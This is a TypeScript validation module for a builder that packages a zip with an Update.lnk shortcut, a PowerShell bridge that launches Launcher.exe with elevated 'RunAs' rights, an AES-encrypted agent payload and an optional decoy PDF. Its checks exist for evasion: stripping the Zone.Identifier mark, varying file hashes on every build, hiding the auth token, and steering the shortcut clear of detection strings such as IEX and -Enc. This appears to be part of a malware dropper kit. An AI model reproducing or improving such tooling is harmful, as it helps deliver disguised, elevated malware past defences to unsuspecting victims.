/**
 * launcher-validate.ts — WP6 validation report card (server side).
 *
 * Server-side validation for the PORTABLE launcher-mode artifact: zip entry
 * count, Zone.Identifier scan, auth token not plaintext, Launcher.exe PE
 * subsystem (GUI), per-build launcher hash diversity, and payload round-trip
 * (decrypt the stamped overlay and compare with the source payload). There is
 * no .lnk to validate — Launcher.exe is the portable double-click entry.
 *
 * TASK_176: the launcher lives NESTED one level deeper — `names.innerFolder`
 * arrives already DOUBLED (`inner/inner`, e.g. `acme/acme`; default
 * `launcher/launcher`), because the doubling happens inside the generator.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as zlib from "zlib";
import * as launcherPool from "./launcher-pool";
import { decryptOverlay } from "./launcher-overlay";

export interface ValidateLauncherParams {
  lnkPath: string;
  launcherPath: string;
  zipPath: string;
  authToken: string;
  payloadPlain: Buffer;
  sealKey: Buffer;
  sealIv: Buffer;
  agentBin: Buffer;
  prevLauncherHash: string | null;
  prevLnkHash: string | null;
  /* FIX 3: expected renameable names (defaults = confirmed working flow). */
  names?: {
    updateLinkName?: string;
    innerFolder?: string;
    launcherName?: string;
    payloadName?: string;
  };
  /* Attached guide PDF (post-install auto-open): when set, the zip MUST carry
   * it inside the launcher subfolder AND the encrypted config MUST reference
   * it (`pdf=` + `pdfDelay=`), or the build fails. */
  pdf?: { name: string; delaySec?: number };
}

export interface ValidateLauncherResult {
  ok: boolean;
  rows: string[];
}

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

/** Minimal ZIP central-directory reader (for zips written by zip-archive.ts). */
function readZipEntries(
  zip: Buffer
): { count: number; names: string[]; localOffsets: Record<string, number> } {
  // EOCD: find "PK\x05\x06" scanning the last 64KB + 22.
  const tailStart = Math.max(0, zip.length - 65_557);
  let eocd = -1;
  for (let i = zip.length - 22; i >= tailStart; i--) {
    if (
      zip[i] === 0x50 &&
      zip[i + 1] === 0x4b &&
      zip[i + 2] === 0x05 &&
      zip[i + 3] === 0x06
    ) {
      eocd = i;
      break;
    }
  }
  if (eocd < 0) return { count: 0, names: [], localOffsets: {} };
  const count = zip.readUInt16LE(eocd + 10);
  const cdOffset = zip.readUInt32LE(eocd + 16);
  const names: string[] = [];
  const localOffsets: Record<string, number> = {};
  let p = cdOffset;
  for (let i = 0; i < count; i++) {
    if (
      p + 46 > zip.length ||
      zip[p] !== 0x50 ||
      zip[p + 1] !== 0x4b ||
      zip[p + 2] !== 0x01 ||
      zip[p + 3] !== 0x02
    ) {
      break;
    }
    const nameLen = zip.readUInt16LE(p + 28);
    const extraLen = zip.readUInt16LE(p + 30);
    const commentLen = zip.readUInt16LE(p + 32);
    const name = zip.subarray(p + 46, p + 46 + nameLen).toString("utf8");
    names.push(name);
    localOffsets[name] = zip.readUInt32LE(p + 42); // local-file-header offset
    p += 46 + nameLen + extraLen + commentLen;
  }
  return { count, names, localOffsets };
}

/**
 * Return the DECOMPRESSED bytes of the zip entry starting at the given local
 * file header offset (DEFLATE method 8, as written by zip-archive.ts), or null
 * if it is not an inflatable store-no-DD store within the archive.
 *
 * WHY: the launcher-mode artifact's `Launcher.exe` is mostly high-entropy
 * AES-256-CTR ciphertext (the sealed overlay). Scanning the RAW compressed zip
 * bytes for short trigrams like "IEX"/"-Enc" randomly matches inside that
 * ciphertext (~30% of builds) and false-fails validation → a spurious 502 and
 * a dead link. Inflating first makes the scan deterministic and
 * ciphertext-immune. The targeted, human-authored Update.lnk is the stable
 * blob worth scanning; AMSI stays "none" (real detections are never weakened).
 */
function readZipEntryInflated(zip: Buffer, localOff: number): Buffer | null {
  if (localOff < 0 || localOff + 30 > zip.length) return null;
  if (
    zip[localOff] !== 0x50 ||
    zip[localOff + 1] !== 0x4b ||
    zip[localOff + 2] !== 0x03 ||
    zip[localOff + 3] !== 0x04
  ) {
    return null;
  }
  const compLen = zip.readUInt32LE(localOff + 18);
  const nameLen = zip.readUInt16LE(localOff + 26);
  const extraLen = zip.readUInt16LE(localOff + 28);
  const dataStart = localOff + 30 + nameLen + extraLen;
  if (dataStart + compLen > zip.length) return null;
  const comp = zip.subarray(dataStart, dataStart + compLen);
  try {
    return zlib.inflateRawSync(comp);
  } catch {
    return null;
  }
}

export async function validateLauncherBuild(
  p: ValidateLauncherParams
): Promise<ValidateLauncherResult> {
  const rows: string[] = [];
  let ok = true;

  const pass = (name: string, detail = "") =>
    rows.push(`PASS| ${name}${detail ? ` (${detail})` : ""}`);
  const fail = (name: string, detail = "") => {
    rows.push(`FAIL| ${name}${detail ? ` (${detail})` : ""}`);
    ok = false;
  };

  // ---- 1. zip entry count + Zone.Identifier ----
  let zip: Buffer;
  try {
    zip = fs.readFileSync(p.zipPath);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    fail("zip readable", message);
    rows.push("RESULT| LAUNCHER-VALIDATE-FAILED");
    return { ok, rows };
  }
  const entries = readZipEntries(zip);
  const updateLinkName = (p.names?.updateLinkName ?? "").trim() || "Update.lnk";
  // TASK_176: `innerFolder` arriving here is already the DOUBLED nested path
  // (`inner/inner`, e.g. `acme/acme`; default `launcher/launcher`) — the
  // doubling happens inside the generator. Zip entries use `/`; the bridge
  // check below converts to `\`.
  const innerFolder = (p.names?.innerFolder ?? "").trim() || "launcher/launcher";
  const launcherName = (p.names?.launcherName ?? "").trim() || "Launcher.exe";
  const payloadName = (p.names?.payloadName ?? "").trim() || "agent.bin";
  const bridgeFolder = innerFolder.replace(/\//g, "\\");
  const wantNames = [updateLinkName, `${innerFolder}/${launcherName}`, `${innerFolder}/${payloadName}`];
  if (p.pdf?.name) wantNames.push(`${innerFolder}/${p.pdf.name}`);
  if (entries.count === wantNames.length) {
    pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
  } else {
    fail("zip entry count", `got ${entries.count}, expected ${wantNames.length}`);
  }
  for (const w of wantNames) {
    if (entries.count === wantNames.length && entries.names.includes(w)) {
      pass(`zip contains ${w}`);
    } else {
      fail(`zip contains ${w}`);
    }
  }
  const zoneHit = entries.names.filter((n) => n.includes("Zone.Identifier"));
  if (zoneHit.length === 0) {
    pass("no Zone.Identifier entry in zip");
  } else {
    fail("Zone.Identifier entry found", zoneHit.join(", "));
  }

  // ---- 3. trigram scan over the DECOMPRESSED Update.lnk (the fixed-system
  //      powershell bridge: Start-Process .\launcher\Launcher.exe -Verb RunAs).
  //      Inflate it so the scan is deterministic/ciphertext-immune. The command
  //      uses -Command/Start-Process/-Verb RunAs (not -Enc/IEX/etc.).
  const needles = [
    "-Enc",
    "EncodedCommand",
    "IEX",
    "Invoke-Expression",
    "FromBase64String",
  ];
  const lnkLocal = entries.localOffsets[updateLinkName];
  const lnkInflated =
    typeof lnkLocal === "number" ? readZipEntryInflated(zip, lnkLocal) : null;
  if (lnkInflated === null || lnkInflated.length === 0) {
    fail("Update.lnk scan", "could not inflate Update.lnk for scanning");
  } else {
    // The PowerShell-bridge command text inside the .lnk is stored as UTF-16LE
    // (each ASCII char followed by a NUL byte), so a raw latin1 scan would miss
    // every run after the first wide-char boundary. Strip the NUL padding to
    // recover the contiguous command text; the trigram + shape checks then match
    // regardless of the custom link/folder names (FIX 3) or the encoding.
    const scanHay = lnkInflated.toString("latin1").replace(/\u0000/g, "");
    const hits = needles.filter((n) => scanHay.includes(n));
    if (hits.length > 0) {
      fail("Update.lnk trigram scan", hits.join(", "));
    } else if (
      !scanHay.includes("powershell.exe") ||
      !scanHay.includes(`${bridgeFolder}\\${launcherName}`) ||
      !scanHay.includes("RunAs")
    ) {
      fail(
        "Update.lnk bridge shape",
        `expected a powershell Start-Process bridge to .\\${bridgeFolder}\\${launcherName} -Verb RunAs`
      );
    } else {
      pass(
        "Update.lnk bridge shape + trigram clean",
        `fixed-system powershell -> .\\${bridgeFolder}\\${launcherName} -Verb RunAs; no -Enc/IEX`
      );
    }
  }

  // ---- 4. auth token not plaintext in the zip ----
  // (Raw bytes: the token lives ONLY inside the encrypted overlay, so ANY
  //  plaintext occurrence in the compressed stream is a real leak to catch.)
  const hay = zip.toString("latin1");
  if (!hay.includes(p.authToken)) {
    pass("auth token not plaintext in zip");
  } else {
    fail("auth token is PLAINTEXT in the zip!");
  }

  // ---- 5. launcher PE subsystem (server-side double check) ----
  const exe = fs.readFileSync(p.launcherPath);
  if (launcherPool.peIsGui(exe)) {
    pass("Launcher.exe PE subsystem = GUI", "server-side Subsystem=2 check");
  } else {
    fail("Launcher.exe PE subsystem", "stamped exe is not a GUI PE");
  }

  // ---- 6. per-build hash diversity ----
  const lzHash = sha256Hex(exe);
  if (p.prevLauncherHash === null || lzHash !== p.prevLauncherHash) {
    pass("launcher SHA-256 differs from previous build", lzHash.slice(0, 16));
  } else {
    fail("launcher SHA-256 equals previous build!", lzHash.slice(0, 16));
  }
  const lnkHash = sha256Hex(fs.readFileSync(p.lnkPath));
  if (p.prevLnkHash === null || lnkHash !== p.prevLnkHash) {
    pass("Update.lnk SHA-256 differs from previous build", lnkHash.slice(0, 16));
  } else {
    fail("Update.lnk SHA-256 equals previous build!", lnkHash.slice(0, 16));
  }

  // ---- 7. payload round-trip byte-identical ----
  try {
    const dec = decryptOverlay(exe, p.sealKey, p.sealIv, p.agentBin);
    if (dec.payload.equals(p.payloadPlain)) {
      pass("payload round-trip byte-identical", `${dec.payload.length} bytes`);
    } else {
      fail(
        "payload round-trip",
        "decrypted payload differs from the source payload"
      );
    }
    const encAuth = encodeURIComponent(p.authToken);
    if (dec.config.includes(`authToken=${encAuth}`)) {
      pass("encrypted config carries authToken", "ciphertext-only");
    } else {
      fail("encrypted config carries authToken", "field missing after decrypt");
    }
    const encPayName = encodeURIComponent(payloadName);
    if (dec.config.includes(`payName=${encPayName}`)) {
      pass("encrypted config carries payload file name", `ciphertext-only (${payloadName})`);
    } else {
      fail("encrypted config carries payload file name", "field missing after decrypt");
    }
    if (p.pdf?.name) {
      const encPdf = encodeURIComponent(p.pdf.name);
      if (dec.config.includes(`pdf=${encPdf}`)) {
        pass("encrypted config carries attached PDF", `ciphertext-only (${p.pdf.name})`);
      } else {
        fail("encrypted config carries attached PDF", "field missing after decrypt");
      }
      const delay = p.pdf.delaySec ?? 0;
      const encDelay = encodeURIComponent(String(delay));
      if (dec.config.includes(`pdfDelay=${encDelay}`)) {
        pass("encrypted config carries PDF open delay", `ciphertext-only (${delay}s)`);
      } else {
        fail("encrypted config carries PDF open delay", "field missing after decrypt");
      }
    }
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    fail("overlay decrypt", message);
  }

  rows.push(
    ok
      ? "RESULT| LAUNCHER-VALIDATE-OK: all rows PASS"
      : "RESULT| LAUNCHER-VALIDATE-FAILED"
  );
  return { ok, rows };
}